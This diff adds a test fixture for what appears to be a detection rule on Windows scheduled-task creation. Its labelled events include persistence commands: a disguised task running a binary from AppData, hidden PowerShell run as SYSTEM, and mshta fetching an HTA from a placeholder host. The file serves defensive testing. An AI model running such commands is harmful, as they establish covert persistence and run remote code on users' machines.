@@ -1,0 +1,12 @@
+[
+  {"note": "Task running a binary from AppData",
+   "event": {"Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks /create /sc minute /mo 15 /tn \"OneDrive Sync\" /tr \"C:\\Users\\alex\\AppData\\Roaming\\sync.exe\" /f"}, "expected": true},
+  {"note": "Task launching hidden PowerShell",
+   "event": {"Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks.exe /create /sc onlogon /tn Updater /tr \"powershell -w hidden -File C:\\ProgramData\\u.ps1\" /ru SYSTEM"}, "expected": true},
+  {"note": "Dash form of /create",
+   "event": {"Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks -create -sc daily -tn t -tr \"mshta https://x.example.invalid/a.hta\""}, "expected": true},
+  {"note": "Task from Program Files",
+   "event": {"Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks /create /sc daily /tn Backup /tr \"C:\\Program Files\\Backup\\run.exe\" /st 02:00"}, "expected": false},
+  {"note": "Querying tasks that mention AppData",
+   "event": {"Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks /query /fo LIST /v | findstr AppData"}, "expected": false}
+]
